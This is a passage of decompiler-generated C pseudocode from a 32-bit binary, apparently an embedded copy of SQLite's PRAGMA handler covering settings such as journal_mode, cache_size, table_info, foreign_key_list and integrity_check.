    if ( sub_100593BE(a1, (unsigned __int8 *)aFull) )
    {
      if ( sub_100593BE(a1, (unsigned __int8 *)aIncremental) )
      {
        v2 = j__atol((const char *)a1);
        return (unsigned __int8)v2 & (unsigned __int8)-(v2 <= 2);
      }
      else
      {
        return 2;
      }
    }
    else
    {
      return 1;
    }
  }
  return result;
}

//----- (1008871D) --------------------------------------------------------
int __usercall sub_1008871D@<eax>(int *a1@<eax>)
{
  int v2; // esi
  int v3; // eax

  v2 = *a1;
  v3 = *(_DWORD *)(*(_DWORD *)(*a1 + 8) + 20);
  if ( !v3 )
    return 0;
  if ( *(_BYTE *)(v2 + 28) && !*(_BYTE *)(v3 + 8) )
  {
    sub_1006256A(v3);
    *(_DWORD *)(*(_DWORD *)(v2 + 8) + 20) = 0;
    sub_1006A029(0, (_DWORD *)v2);
    return 0;
  }
  sub_10059320(a1, aTemporaryStora);
  return 1;
}

//----- (10088764) --------------------------------------------------------
int __usercall sub_10088764@<eax>(unsigned __int8 *a1@<eax>, int *a2@<edi>)
{
  char v3; // al
  int v4; // ebx
  int v5; // ebx
  int v6; // esi

  v3 = *a1;
  if ( v3 < 48 || v3 > 50 )
  {
    if ( sub_100593BE(a1, (unsigned __int8 *)aFile) )
      v5 = sub_100593BE(a1, (unsigned __int8 *)aMemory_2) != 0 ? -1 : 1;
    else
      v5 = 0;
    v4 = v5 + 1;
  }
  else
  {
    v4 = v3 - 48;
  }
  v6 = *a2;
  if ( *(unsigned __int8 *)(*a2 + 29) != v4 )
  {
    if ( sub_1008871D(a2) )
      return 1;
    *(_BYTE *)(v6 + 29) = v4;
  }
  return 0;
}

//----- (100887C7) --------------------------------------------------------
int __usercall sub_100887C7@<eax>(int *a1@<eax>, _BYTE *a2, ...)
{
  int *v3; // eax
  int *v4; // ebx
  _DWORD *v5; // esi
  int v7; // [esp+Ch] [ebp-4h]
  __int64 Src; // [esp+1Ch] [ebp+Ch] BYREF
  va_list Srca; // [esp+1Ch] [ebp+Ch]
  va_list va1; // [esp+24h] [ebp+14h] BYREF

  va_start(va1, a2);
  va_start(Srca, a2);
  Src = va_arg(va1, _QWORD);
  v3 = sub_1007C271(a1);
  ++a1[18];
  v4 = v3;
  v7 = a1[18];
  v5 = sub_10059073(*a1, 8);
  if ( v5 )
    memcpy(v5, Srca, 8u);
  sub_1005AC02(v4, 8, 0, v7, 0, (unsigned __int16 *)v5, (_BYTE *)0xFFFFFFF3);
  sub_1005B4BC(1, (int)v4);
  sub_1005B518((int)v4, 0, 0, a2, 0);
  return sub_1005ABE8((int)v4, 16, v7, 1);
}

//----- (1008883F) --------------------------------------------------------
int __usercall sub_1008883F@<eax>(int *a1@<eax>, unsigned __int8 *a2, char *a3)
{
  int v4; // esi
  char **i; // ebx
  int v7; // esi
  unsigned int v8; // edi
  _DWORD *v9; // [esp+Ch] [ebp-4h]

  v4 = 0;
  for ( i = &off_100FC478; sub_100593BE(a2, (unsigned __int8 *)*i); i += 2 )
  {
    if ( ++v4 >= 13 )
      return 0;
  }
  v7 = *a1;
  v9 = sub_1007C271(a1);
  if ( v9 )
  {
    if ( a3 )
    {
      v8 = (unsigned int)i[1];
      if ( !*(_BYTE *)(v7 + 28) )
        v8 &= ~0x4000000u;
      if ( (sub_10088678(a3) & 1) != 0 )
        *(_DWORD *)(v7 + 12) |= v8;
      else
        *(_DWORD *)(v7 + 12) &= ~v8;
      sub_1005AB66((int)v9, 119, 0, 0, 0);
    }
    else
    {
      sub_100887C7(a1, *i, (unsigned __int64)(((unsigned int)i[1] & *(_DWORD *)(v7 + 12)) != 0));
    }
  }
  return 1;
}
// 100FC478: using guessed type char *off_100FC478;

//----- (100888DA) --------------------------------------------------------
char *__usercall sub_100888DA@<eax>(unsigned __int8 a1@<al>)
{
  int v1; // eax
  int v2; // eax
  int v3; // eax

  v1 = a1 - 6;
  if ( !v1 )
    return aRestrict;
  v2 = v1 - 1;
  if ( !v2 )
    return aSetNull;
  v3 = v2 - 1;
  if ( !v3 )
    return aSetDefault;
  if ( v3 == 1 )
    return aCascade;
  return aNoAction;
}

//----- (10088909) --------------------------------------------------------
void __cdecl sub_10088909(int *a1, int a2, int a3, int a4, int a5)
{
  _DWORD *v5; // esi
  _DWORD *v6; // eax
  int v7; // eax
  int v8; // edi
  char *v9; // eax
  int v10; // edi
  _DWORD *v11; // esi
  int v12; // edi
  int v13; // eax
  int v14; // ecx
  int v15; // esi
  int v16; // edx
  int v17; // eax
  int v18; // esi
  int v19; // ebx
  int v20; // eax
  int v21; // ebx
  int v22; // eax
  int v23; // edi
  int v24; // eax
  int v25; // eax
  int v26; // edi
  int v27; // esi
  unsigned __int8 *v28; // esi
  int v29; // esi
  int v30; // edi
  int v31; // esi
  int v32; // ecx
  int v33; // eax
  int v34; // edx
  int v35; // eax
  int v36; // eax
  int *v37; // esi
  _BYTE *v38; // edi
  int v39; // eax
  bool v40; // cc
  int v41; // eax
  int v42; // esi
  int v43; // eax
  int v44; // edi
  int v45; // eax
  int v46; // eax
  int *v47; // edi
  int v48; // esi
  int v49; // edx
  int v50; // edx
  unsigned __int8 *v51; // edi
  int v52; // esi
  int v53; // eax
  int v54; // ecx
  char *v55; // edi
  char v56; // al
  unsigned __int8 *v57; // esi
  int v58; // edi
  int v59; // edi
  int v60; // esi
  int *v61; // edi
  unsigned __int16 *v62; // eax
  unsigned __int16 *v63; // eax
  int *v64; // eax
  int v65; // esi
  int j; // edi
  int v67; // esi
  int *v68; // esi
  int *v69; // eax
  int v70; // esi
  int *v71; // esi
  int v72; // edi
  int v73; // esi
  int v74; // edi
  _DWORD *v75; // esi
  int v76; // esi
  _DWORD *k; // esi
  unsigned __int16 **v78; // edi
  int *v79; // esi
  int *v80; // eax
  int v81; // esi
  int *v82; // esi
  unsigned __int16 *v83; // edi
  int v84; // ecx
  int v85; // eax
  char v86; // al
  __int16 v87; // ax
  unsigned __int8 *v88; // eax
  void *const *v89; // esi
  char v90; // al
  _DWORD *v91; // edi
  unsigned __int8 v92; // al
  int v93; // esi
  int v94; // eax
  int v95; // esi
  int v96; // esi
  int v97; // esi
  int v98; // edx
  int v99; // esi
  int v100; // esi
  int v101; // esi
  int v102; // edi
  _DWORD *v103; // esi
  int v104; // edi
  int m; // eax
  unsigned __int16 *v106; // eax
  int v107; // esi
  bool v108; // zf
  int v109; // esi
  int v110; // ebx
  int *v111; // edi
  unsigned __int16 **v112; // esi
  int v113; // eax
  int v114; // ebx
  int *v115; // edi
  int v116; // esi
  int v117; // esi
  int v118; // ebx
  int v119; // ebx
  int *v120; // edi
  int v121; // esi
  int v122; // [esp-8h] [ebp-50h]
  __int64 v123; // [esp+Ch] [ebp-3Ch] BYREF
  int v124; // [esp+14h] [ebp-34h]
  BOOL v125; // [esp+18h] [ebp-30h]
  int *v126; // [esp+1Ch] [ebp-2Ch] BYREF
  int v127; // [esp+20h] [ebp-28h] BYREF
  int v128; // [esp+24h] [ebp-24h]
  int v129; // [esp+28h] [ebp-20h]
  char *v130; // [esp+2Ch] [ebp-1Ch]
  int v131; // [esp+30h] [ebp-18h]
  void *Src; // [esp+34h] [ebp-14h]
  int n; // [esp+38h] [ebp-10h]
  _DWORD *v134; // [esp+3Ch] [ebp-Ch]
  char *String; // [esp+40h] [ebp-8h]
  int v136; // [esp+44h] [ebp-4h]
  int v137; // [esp+50h] [ebp+8h]
  int i; // [esp+50h] [ebp+8h]
  int v139; // [esp+50h] [ebp+8h]
  int v140; // [esp+50h] [ebp+8h]
  int v141; // [esp+50h] [ebp+8h]
  int v142; // [esp+50h] [ebp+8h]
  int v143; // [esp+50h] [ebp+8h]
  _DWORD *v144; // [esp+50h] [ebp+8h]
  int v145; // [esp+50h] [ebp+8h]

  v134 = (_DWORD *)*a1;
  v5 = v134;
  v6 = sub_1005AA80((int)v134);
  a1[3] = (int)v6;
  v136 = (int)v6;
  if ( v6 )
  {
    a1[18] = 2;
    v7 = sub_1006A35E(a3, a1, (int *)&v126, a2);
    n = v7;
    if ( v7 >= 0 )
    {
      v8 = v5[2] + 16 * v7;
      v131 = v8;
      if ( v7 != 1 || !sub_1006CA50((int)a1) )
      {
        Src = (void *)sub_1006A297((int)v126, (int)v5);
        if ( Src )
        {
          if ( a5 )
            v9 = (char *)sub_10055484((int)v5, aT, a4);
          else
            v9 = (char *)sub_1006A297(a4, (int)v5);
          String = v9;
          v129 = *(_DWORD *)(a3 + 4);
          if ( v129 )
            v130 = *(char **)v8;
          else
            v130 = 0;
          if ( !sub_100593BE((unsigned __int8 *)Src, (unsigned __int8 *)aDefaultCacheSi) )
          {
            if ( !sub_10058497(a1) )
            {
              v10 = v136;
              sub_1005B0F6(n, (int *)v136);
              if ( !String )
              {
                v11 = (_DWORD *)v136;
                sub_1005B4BC(1, v136);
                v12 = (int)v11;
                sub_1005B518((int)v11, 0, 0, aCacheSize, 0);
                a1[18] += 2;
                v13 = sub_1005AD69(v11, 8, (int)&unk_100FC4E0);
                v14 = (int)v11;
                v15 = v13;
                sub_1005ADFE(v13, n, v14);
                sub_1005ADFE(v15 + 1, v16, v12);
                if ( *(_DWORD *)(v12 + 12) > v15 + 6 )
                  *(_DWORD *)(20 * (v15 + 6) + *(_DWORD *)(v12 + 20) + 4) = 2000;
                goto LABEL_264;
              }
              v17 = j__atol(String);
              v18 = v17;
              if ( v17 < 0 )
                v18 = -v17;
              sub_1006CB39(a1, n, 0);
              sub_1005ABE8(v10, 7, v18, 1);
              sub_1005AB66(v10, 35, n, 2, 3);
              v19 = sub_1005AB66(v10, 112, 2, 0, 0);
              sub_1005ABE8(v10, 7, -v18, 1);
              sub_1005AE20(v19, v10);
              sub_1005AB66(v10, 36, n, 3, 1);
              v20 = v131;
              *(_DWORD *)(*(_DWORD *)(v131 + 12) + 76) = v18;
              v21 = *(_DWORD *)(*(_DWORD *)(v20 + 12) + 76);
              v22 = v131;
LABEL_114:
              sub_10062612(*(_DWORD *)(v22 + 4), v21);
              goto LABEL_264;
            }
            goto LABEL_266;
          }
          if ( !sub_100593BE((unsigned __int8 *)Src, (unsigned __int8 *)aPageSize) )
          {
            v23 = *(_DWORD *)(v8 + 4);
            if ( String )
            {
              v25 = j__atol(String);
              v5[9] = v25;
              if ( sub_100626A1(v25, v23, -1, 0) == 7 )
                *((_BYTE *)v5 + 30) = 1;
            }
            else
            {
              if ( v23 )
                v24 = *(unsigned __int16 *)(*(_DWORD *)(v23 + 4) + 20);
              else
                v24 = 0;
              sub_100887C7(a1, aPageSize_0, (__int64)v24);
            }
            goto LABEL_264;
          }
          if ( !sub_100593BE((unsigned __int8 *)Src, (unsigned __int8 *)aMaxPageCount) )
          {
            v26 = *(_DWORD *)(v8 + 4);
            v127 = v26;
            v130 = 0;
            if ( String )
              v130 = (char *)j__atol(String);
            if ( v26 )
            {
              sub_10068C39(v26);
              v27 = **(_DWORD **)(v26 + 4);
              if ( (int)v130 > 0 )
                *(_DWORD *)(v27 + 128) = v130;
              sub_1006DFE2(0, v27);
              v28 = *(unsigned __int8 **)(v27 + 128);
              sub_10068CA7(v127);
              v130 = (char *)v28;
            }
            sub_100887C7(a1, aMaxPageCount_0, (__int64)(int)v130);
            goto LABEL_264;
          }
          if ( !sub_100593BE((unsigned __int8 *)Src, (unsigned __int8 *)aPageCount) )
          {
            if ( !sub_10058497(a1) )
            {
              v29 = n;
              sub_1006CAC0(a1, n);
              v30 = ++a1[18];
              sub_1005ABE8(v136, 131, v29, v30);
              sub_1005ABE8(v136, 16, v30, 1);
              v31 = v136;
              sub_1005B4BC(1, v136);
              sub_1005B518(v31, 0, 0, aPageCount_0, 0);
              goto LABEL_264;
            }
            goto LABEL_266;
          }
          if ( !sub_100593BE((unsigned __int8 *)Src, (unsigned __int8 *)aLockingMode) )
          {
            v127 = (int)aNormal;
            if ( !String )
              goto LABEL_45;
            if ( !sub_100593BE((unsigned __int8 *)String, (unsigned __int8 *)aExclusive) )
            {
              v32 = 1;
              goto LABEL_46;
            }
            if ( sub_100593BE((unsigned __int8 *)String, (unsigned __int8 *)aNormal_0) )
LABEL_45:
              v32 = -1;
            else
              v32 = 0;
LABEL_46:
            if ( !v129 )
            {
              if ( v32 == -1 )
              {
                v33 = *((unsigned __int8 *)v5 + 31);
LABEL_59:
                if ( v33 == 1 )
                  v127 = (int)aExclusive_0;
                v37 = (int *)v136;
                sub_1005B4BC(1, v136);
                sub_1005B518((int)v37, 0, 0, aLockingMode_0, 0);
                sub_1005AC02(v37, 94, 0, 1, 0, (unsigned __int16 *)v127, 0);
                goto LABEL_79;
              }
              v137 = 2;
              if ( (int)v5[1] > 2 )
              {
                v34 = 32;
                do
                {
                  v35 = **(_DWORD **)(*(_DWORD *)(v34 + v5[2] + 4) + 4);
                  if ( !*(_BYTE *)(v35 + 11) )
                    *(_BYTE *)(v35 + 4) = v32;
                  ++v137;
                  v34 += 16;
                }
                while ( v137 < v5[1] );
              }
              *((_BYTE *)v5 + 31) = v32;
            }
            v36 = **(_DWORD **)(*(_DWORD *)(v8 + 4) + 4);
            if ( v32 >= 0 && !*(_BYTE *)(v36 + 11) )
              *(_BYTE *)(v36 + 4) = v32;
            v33 = *(unsigned __int8 *)(v36 + 4);
            goto LABEL_59;
          }
          if ( !sub_100593BE((unsigned __int8 *)Src, (unsigned __int8 *)aJournalMode) )
          {
            if ( String )
            {
              v38 = sub_10059297(String);
              for ( i = 4; i >= 0; --i )
              {
                if ( !sub_100593F9(String, (int)v38, (unsigned __int8 *)off_100FC500[i]) )
                  break;
              }
            }
            else
            {
              i = -1;
            }
            if ( !v129 )
            {
              if ( i == -1 )
              {
                v39 = *((unsigned __int8 *)v5 + 32);
LABEL_78:
                v37 = (int *)v136;
                v139 = v39;
                sub_1005B4BC(1, v136);
                sub_1005B518((int)v37, 0, 0, aJournalMode_0, 0);
                sub_1005AC02(v37, 94, 0, 1, 0, (unsigned __int16 *)off_100FC500[v139], (_BYTE *)0xFFFFFFFE);
                goto LABEL_79;
              }
              v40 = v5[1] <= 1;
              v128 = 1;
              if ( !v40 )
              {
                v127 = 16;
                do
                {
                  v41 = *(_DWORD *)(v127 + v5[2] + 4);
                  if ( v41 )
                  {
                    sub_1006F6DE(i, **(_DWORD **)(v41 + 4));
                    v5 = v134;
                  }
                  ++v128;
                  v127 += 16;
                }
                while ( v128 < v5[1] );
              }
              *((_BYTE *)v5 + 32) = i;
            }
            v39 = sub_1006F6DE(i, **(_DWORD **)(*(_DWORD *)(v131 + 4) + 4));
            goto LABEL_78;
          }
          if ( !sub_100593BE((unsigned __int8 *)Src, (unsigned __int8 *)aJournalSizeLim) )
          {
            v42 = **(_DWORD **)(*(_DWORD *)(v8 + 4) + 4);
            v123 = -2i64;
            if ( String )
            {
              sub_100597DB(String, (int *)&v123);
              v43 = HIDWORD(v123);
              if ( v123 < -1 )
              {
                LODWORD(v123) = -1;
                v43 = -1;
              }
              *(_DWORD *)(v42 + 160) = v123;
              *(_DWORD *)(v42 + 164) = v43;
            }
            sub_100887C7(a1, aJournalSizeLim_0, *(_DWORD *)(v42 + 160), *(_DWORD *)(v42 + 164));
            goto LABEL_264;
          }
          if ( !sub_100593BE((unsigned __int8 *)Src, (unsigned __int8 *)aAutoVacuum) )
          {
            v44 = *(_DWORD *)(v8 + 4);
            if ( !sub_10058497(a1) )
            {
              if ( String )
              {
                v46 = sub_100886D0((unsigned __int8 *)String);
                v140 = v46;
                *((_BYTE *)v134 + 33) = v46;
                if ( v46 >= 0 && !sub_10062735(v44, v46) && (v140 == 1 || v140 == 2) )
                {
                  v47 = (int *)v136;
                  v48 = sub_1005AD69((_DWORD *)v136, 6, (int)&unk_100FC514);
                  sub_1005ADFE(v48, n, (int)v47);
                  sub_1005ADFE(v48 + 1, v49, (int)v47);
                  if ( v47[3] > v48 + 2 )
                    *(_DWORD *)(20 * (v48 + 2) + v47[5] + 8) = v48 + 4;
                  sub_1005ADFE(v48 + 4, v140 - 1, (int)v47);
                  sub_1005ADFE(v48 + 5, n, (int)v47);
                  sub_1005B0F6(v50, v47);
                }
              }
              else
              {
                if ( v44 )
                  v45 = sub_10062784(v44);
                else
                  v45 = 0;
                sub_100887C7(a1, aAutoVacuum_0, (__int64)v45);
              }
              goto LABEL_264;
            }
            goto LABEL_266;
          }
          v51 = (unsigned __int8 *)Src;
          if ( !sub_100593BE((unsigned __int8 *)Src, (unsigned __int8 *)aIncrementalVac) )
          {
            if ( !sub_10058497(a1) )
            {
              if ( !String || !sub_100598E8(String, &v127) || v127 <= 0 )
                v127 = 0x7FFFFFFF;
              sub_1006CB39(a1, n, 0);
              v52 = v136;
              sub_1005ABE8(v136, 7, v127, 1);
              v141 = sub_1005ABD1(v52, 118, n);
              sub_1005ABD1(v52, 16, 1);
              sub_1005AB66(v52, 20, 1, -1, 0);
              sub_1005ABE8(v52, 112, 1, v141);
              sub_1005AE20(v141, v52);
              goto LABEL_264;
            }
            goto LABEL_266;
          }
          if ( !sub_100593BE(v51, (unsigned __int8 *)aCacheSize_0) )
          {
            if ( !sub_10058497(a1) )
            {
              if ( !String )
              {
                sub_100887C7(a1, aCacheSize_1, (__int64)*(int *)(*(_DWORD *)(v131 + 12) + 76));
                goto LABEL_264;
              }
              v53 = j__atol(String);
              if ( v53 < 0 )
                v53 = -v53;
              v54 = v131;
              *(_DWORD *)(*(_DWORD *)(v131 + 12) + 76) = v53;
              v21 = *(_DWORD *)(*(_DWORD *)(v54 + 12) + 76);
              v22 = v54;
              goto LABEL_114;
            }
LABEL_266:
            sub_10058EC7((int)v134, (unsigned int)Src);
            sub_10058EC7((int)v134, (unsigned int)String);
            return;
          }
          if ( !sub_100593BE(v51, (unsigned __int8 *)aTempStore) )
          {
            if ( String )
              sub_10088764((unsigned __int8 *)String, a1);
            else
              sub_100887C7(a1, aTempStore_0, *((unsigned __int8 *)v5 + 29), 0);
            goto LABEL_264;
          }
          if ( !sub_100593BE(v51, (unsigned __int8 *)aTempStoreDirec) )
          {
            v55 = String;
            if ( String )
            {
              if ( !*String
                || !(*(int (__cdecl **)(_DWORD, char *, int, int **))(*v5 + 32))(*v5, String, 1, &v126) && v126 )
              {
                if ( *((_BYTE *)v5 + 29) <= 1u )
                  sub_1008871D(a1);
                sub_10058E74(dword_101863F0);
                if ( *v55 )
                  dword_101863F0 = (int)sub_10059194(v55);
                else
                  dword_101863F0 = 0;
                goto LABEL_264;
              }
              sub_10059320(a1, aNotAWritableDi);
              goto LABEL_266;
            }
            if ( dword_101863F0 )
            {
              v37 = (int *)v136;
              sub_1005B4BC(1, v136);
              sub_1005B518((int)v37, 0, 0, aTempStoreDirec_0, 0);
              sub_1005AC02(v37, 94, 0, 1, 0, (unsigned __int16 *)dword_101863F0, 0);
              goto LABEL_79;
            }
LABEL_264:
            sub_1005AB66(v136, 119, 1, 0, 0);
            if ( *((_BYTE *)v134 + 28) )
              sub_10062646(*(_DWORD *)(v131 + 4), *(unsigned __int8 *)(v131 + 9), (v134[3] >> 21) & 1);
            goto LABEL_266;
          }
          if ( !sub_100593BE(v51, (unsigned __int8 *)aSynchronous) )
          {
            if ( !sub_10058497(a1) )
            {
              if ( String )
              {
                if ( *((_BYTE *)v5 + 28) )
                {
                  v56 = sub_10088678(String);
                  *(_BYTE *)(v131 + 9) = v56 + 1;
                }
                else
                {
                  sub_10059320(a1, aSafetyLevelMay);
                }
              }
              else
              {
                sub_100887C7(a1, aSynchronous_0, (__int64)(*(unsigned __int8 *)(v131 + 9) - 1));
              }
              goto LABEL_264;
            }
            goto LABEL_266;
          }
          if ( sub_1008883F(a1, v51, String) )
            goto LABEL_264;
          v57 = v51;
          if ( !sub_100593BE(v51, (unsigned __int8 *)aTableInfo) && String )
          {
            if ( !sub_10058497(a1) )
            {
              v128 = (int)sub_10069E40((int)v134, (unsigned __int8 *)String, (unsigned __int8 *)v130);
              if ( v128 )
              {
                v127 = 0;
                sub_1005B4BC(6, v136);
                a1[18] = 6;
                v58 = v136;
                sub_1005B518(v136, 0, 0, aCid, 0);
                sub_1005B518(v58, 1, 0, aName, 0);
                sub_1005B518(v58, 2, 0, aType, 0);
                sub_1005B518(v58, 3, 0, aNotnull, 0);
                sub_1005B518(v58, 4, 0, aDfltValue, 0);
                sub_1005B518(v58, 5, 0, aPk, 0);
                v59 = v128;
                sub_1006B423(a1, v128);
                v60 = *(_DWORD *)(v59 + 16);
                v142 = 0;
                if ( *(int *)(v59 + 12) > 0 )
                {
                  v61 = (int *)v136;
                  do
                  {
                    if ( *(_BYTE *)(v60 + 23) )
                    {
                      ++v127;
                    }
                    else
                    {
                      sub_1005ABE8((int)v61, 7, v142 - v127, 1);
                      sub_1005AC02(v61, 94, 0, 2, 0, *(unsigned __int16 **)v60, 0);
                      v62 = *(unsigned __int16 **)(v60 + 12);
                      if ( !v62 )
                        v62 = (unsigned __int16 *)&unk_10186495;
                      sub_1005AC02(v61, 94, 0, 3, 0, v62, 0);
                      sub_1005ABE8((int)v61, 7, *(_BYTE *)(v60 + 20) != 0, 4);
                      v63 = *(unsigned __int16 **)(v60 + 8);
                      if ( v63 )
                        sub_1005AC02(v61, 94, 0, 5, 0, v63, 0);
                      else
                        sub_1005AB66((int)v61, 10, 0, 5, 0);
                      sub_1005ABE8((int)v61, 7, *(unsigned __int8 *)(v60 + 21), 6);
                      sub_1005AB66((int)v61, 16, 1, 6, 0);
                    }
                    ++v142;
                    v60 += 24;
                  }
                  while ( v142 < *(_DWORD *)(v128 + 12) );
                }
              }
              goto LABEL_264;
            }
            goto LABEL_266;
          }
          if ( !sub_100593BE(v51, (unsigned __int8 *)aIndexInfo) && String )
          {
            if ( !sub_10058497(a1) )
            {
              v64 = sub_10069F30((unsigned __int8 *)String, (unsigned __int8 *)v130);
              v129 = (int)v64;
              if ( v64 )
              {
                v65 = v136;
                v126 = (int *)v64[4];
                sub_1005B4BC(3, v136);
                a1[18] = 3;
                sub_1005B518(v65, 0, 0, aSeqno, 0);
                sub_1005B518(v65, 1, 0, aCid_0, 0);
                sub_1005B518(v65, 2, 0, aName_0, 0);
                for ( j = 0; j < *(_DWORD *)(v129 + 4); ++j )
                {
                  v67 = *(_DWORD *)(*(_DWORD *)(v129 + 8) + 4 * j);
                  sub_1005ABE8(v136, 7, j, 1);
                  sub_1005ABE8(v136, 7, v67, 2);
                  sub_1005AC02((int *)v136, 94, 0, 3, 0, *(unsigned __int16 **)(24 * v67 + v126[4]), 0);
                  sub_1005AB66(v136, 16, 1, 3, 0);
                }
              }
              goto LABEL_264;
            }
            goto LABEL_266;
          }
          if ( !sub_100593BE(v51, (unsigned __int8 *)aIndexList) && String )
          {
            if ( !sub_10058497(a1) )
            {
              v68 = sub_10069E40((int)v134, (unsigned __int8 *)String, (unsigned __int8 *)v130);
              if ( v68 )
              {
                v69 = sub_1007C271(a1);
                v70 = v68[5];
                v136 = (int)v69;
                v126 = (int *)v70;
                if ( v70 )
                {
                  v71 = v69;
                  v127 = 0;
                  sub_1005B4BC(3, (int)v69);
                  a1[18] = 3;
                  sub_1005B518((int)v71, 0, 0, aSeq, 0);
                  sub_1005B518((int)v71, 1, 0, aName_1, 0);
                  sub_1005B518((int)v71, 2, 0, aUnique_0, 0);
                  v72 = (int)v126;
                  do
                  {
                    sub_1005ABE8((int)v71, 7, v127, 1);
                    sub_1005AC02(v71, 94, 0, 2, 0, *(unsigned __int16 **)v72, 0);
                    sub_1005ABE8((int)v71, 7, *(_BYTE *)(v72 + 24) != 0, 3);
                    sub_1005AB66((int)v71, 16, 1, 3, 0);
                    v72 = *(_DWORD *)(v72 + 32);
                    ++v127;
                  }
                  while ( v72 );
                }
              }
              goto LABEL_264;
            }
            goto LABEL_266;
          }
          if ( !sub_100593BE(v51, (unsigned __int8 *)aDatabaseList) )
          {
            if ( !sub_10058497(a1) )
            {
              v73 = v136;
              sub_1005B4BC(3, v136);
              a1[18] = 3;
              sub_1005B518(v73, 0, 0, aSeq_0, 0);
              sub_1005B518(v73, 1, 0, aName_2, 0);
              sub_1005B518(v73, 2, 0, aFile_0, 0);
              v143 = 0;
              if ( (int)v134[1] > 0 )
              {
                v74 = 0;
                v75 = v134;
                do
                {
                  if ( *(_DWORD *)(v74 + v75[2] + 4) )
                  {
                    sub_1005ABE8(v136, 7, v143, 1);
                    sub_1005AC02((int *)v136, 94, 0, 2, 0, *(unsigned __int16 **)(v74 + v75[2]), 0);
                    sub_1005AC02(
                      (int *)v136,
                      94,
                      0,
                      3,
                      0,
                      *(unsigned __int16 **)(**(_DWORD **)(*(_DWORD *)(v74 + v75[2] + 4) + 4) + 132),
                      0);
                    sub_1005AB66(v136, 16, 1, 3, 0);
                  }
                  ++v143;
                  v74 += 16;
                }
                while ( v143 < v75[1] );
              }
              goto LABEL_264;
            }
            goto LABEL_266;
          }
          if ( !sub_100593BE(v51, (unsigned __int8 *)aCollationList) )
          {
            v76 = v136;
            v127 = 0;
            sub_1005B4BC(2, v136);
            a1[18] = 2;
            sub_1005B518(v76, 0, 0, aSeq_1, 0);
            sub_1005B518(v76, 1, 0, aName_3, 0);
            for ( k = (_DWORD *)v134[98]; k; k = (_DWORD *)*k )
            {
              v78 = (unsigned __int16 **)k[2];
              sub_1005ABE8(v136, 7, v127++, 1);
              sub_1005AC02((int *)v136, 94, 0, 2, 0, *v78, 0);
              sub_1005AB66(v136, 16, 1, 2, 0);
            }
            goto LABEL_264;
          }
          if ( !sub_100593BE(v51, (unsigned __int8 *)aForeignKeyList) && String )
          {
            if ( !sub_10058497(a1) )
            {
              v79 = sub_10069E40((int)v134, (unsigned __int8 *)String, (unsigned __int8 *)v130);
              v126 = v79;
              if ( v79 )
              {
                v80 = sub_1007C271(a1);
                v81 = v79[9];
                v136 = (int)v80;
                n = v81;
                if ( v81 )
                {
                  v82 = v80;
                  v127 = 0;
                  sub_1005B4BC(8, (int)v80);
                  a1[18] = 8;
                  sub_1005B518((int)v82, 0, 0, aId, 0);
                  sub_1005B518((int)v82, 1, 0, aSeq_2, 0);
                  sub_1005B518((int)v82, 2, 0, aTable_1, 0);
                  sub_1005B518((int)v82, 3, 0, aFrom, 0);
                  sub_1005B518((int)v82, 4, 0, aTo, 0);
                  sub_1005B518((int)v82, 5, 0, aOnUpdate, 0);
                  sub_1005B518((int)v82, 6, 0, aOnDelete, 0);
                  sub_1005B518((int)v82, 7, 0, aMatch_1, 0);
                  do
                  {
                    v40 = *(_DWORD *)(n + 20) <= 0;
                    v129 = 0;
                    if ( !v40 )
                    {
                      v144 = (_DWORD *)(n + 36);
                      do
                      {
                        v83 = (unsigned __int16 *)v144[1];
                        v130 = sub_100888DA(*(_BYTE *)(n + 25));
                        v128 = (int)sub_100888DA(*(_BYTE *)(v84 + 26));
                        sub_1005ABE8((int)v82, 7, v127, 1);
                        sub_1005ABE8((int)v82, 7, v129, 2);
                        sub_1005AC02(v82, 94, 0, 3, 0, *(unsigned __int16 **)(n + 8), 0);
                        sub_1005AC02(v82, 94, 0, 4, 0, *(unsigned __int16 **)(24 * *v144 + v126[4]), 0);
                        sub_1005AC02(v82, v83 != 0 ? 94 : 10, 0, 5, 0, v83, 0);
                        sub_1005AC02(v82, 94, 0, 6, 0, (unsigned __int16 *)v128, 0);
                        sub_1005AC02(v82, 94, 0, 7, 0, (unsigned __int16 *)v130, 0);
                        sub_1005AC02(v82, 94, 0, 8, 0, (unsigned __int16 *)aNone_0, 0);
                        sub_1005AB66((int)v82, 16, 1, 8, 0);
                        v144 += 2;
                        ++v129;
                      }
                      while ( v129 < *(_DWORD *)(n + 20) );
                    }
                    v85 = *(_DWORD *)(n + 4);
                    ++v127;
                    n = v85;
                  }
                  while ( v85 );
                }
              }
              goto LABEL_264;
            }
            goto LABEL_266;
          }
          if ( !sub_100593BE(v51, (unsigned __int8 *)aCaseSensitiveL) )
          {
            if ( String )
            {
              v86 = sub_10088678(String);
              sub_10068B49(v134, v86 & 1);
            }
            goto LABEL_264;
          }
          if ( !sub_100593BE(v51, (unsigned __int8 *)aIntegrityCheck)
            || !sub_100593BE(v51, (unsigned __int8 *)aQuickCheck) )
          {
            v125 = *v51 == 113;
            if ( !sub_10058497(a1) )
            {
              v100 = v136;
              a1[18] = 6;
              sub_1005B4BC(1, v100);
              sub_1005B518(v100, 0, 0, aIntegrityCheck_0, 0);
              v127 = 100;
              if ( String )
              {
                v127 = j__atol(String);
                if ( v127 <= 0 )
                  v127 = 100;
              }
              sub_1005ABE8(v136, 7, v127, 1);
              v40 = v134[1] <= 0;
              v130 = 0;
              if ( !v40 )
              {
                v128 = 0;
                do
                {
                  n = 0;
                  sub_1006CAC0(a1, (int)v130);
                  v101 = sub_1005ABD1(v136, 112, 1);
                  sub_1005AB66(v136, 6, 0, 0, 0);
                  sub_1005AE20(v101, v136);
                  v102 = *(_DWORD *)(v128 + v134[2] + 12);
                  v103 = *(_DWORD **)(v102 + 12);
                  v104 = v102 + 4;
                  while ( v103 )
                  {
                    v122 = *(_DWORD *)(v103[2] + 24);
                    v126 = (int *)v103[2];
                    sub_1005ABE8(v136, 7, v122, n + 2);
                    for ( m = v126[5]; ; m = *(_DWORD *)(v129 + 32) )
                    {
                      ++n;
                      v129 = m;
                      if ( !m )
                        break;
                      sub_1005ABE8(v136, 7, *(_DWORD *)(v129 + 20), n + 2);
                    }
                    v103 = (_DWORD *)*v103;
                  }
                  if ( a1[18] < n + 4 )
                    a1[18] = n + 4;
                  sub_1005AB66(v136, 103, 2, n, 1);
                  sub_1005AE0E(v136, (char)v130);
                  v126 = (int *)sub_1005ABD1(v136, 73, 2);
                  v106 = (unsigned __int16 *)sub_10055484(
                                               (int)v134,
                                               "*** in database %s ***\n",
                                               *(const char **)(v128 + v134[2]));
                  v107 = v136;
